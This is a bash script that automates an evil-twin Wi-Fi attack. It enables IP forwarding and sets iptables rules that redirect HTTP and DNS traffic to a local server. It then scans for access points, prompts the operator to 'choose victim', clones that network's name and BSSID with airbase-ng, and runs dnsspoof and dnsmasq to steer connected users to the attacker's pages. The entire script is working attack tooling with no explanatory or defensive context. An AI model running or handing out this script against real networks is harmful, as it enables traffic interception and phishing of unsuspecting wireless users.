#!/bin/bash
sudo /etc/init.d/apache2 start
sudo /etc/init.d/mysql start
echo "---web service checked---"

sudo su <<HERE
echo 1 > /proc/sys/net/ipv4/ip_forward
HERE
echo "---ipfw checked---"

sudo iptables --flush
sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
echo "---iptb checked---"

sudo airmon-ng start wlan0
echo "monitor cheched"

sudo gnome-terminal --tab -t 'List hostspot' -e "sudo airodump-ng wlan0mon"&
echo "Choose victim in list"
echo "Victim ESSID:"
read essid
echo "Victim BSSID:"
read bssid
echo "Victim Channel:"
read channel

sudo gnome-terminal --tab -t 'fake hostspot' -e "sudo airbase-ng -a "$bssid" --essid "$essid" -c $channel wlan0mon"&
sleep 2s

sudo ifconfig at0 10.0.0.1 up
echo "---at0 up checked---"

sudo gnome-terminal --tab -t 'Dnsspoof' -e "sudo dnsspoof -i at0"&
echo "---dnsspoof checked---"

sudo dnsmasq -C ~/dnsmasq.conf -d
echo "---dnsmasq checked---"

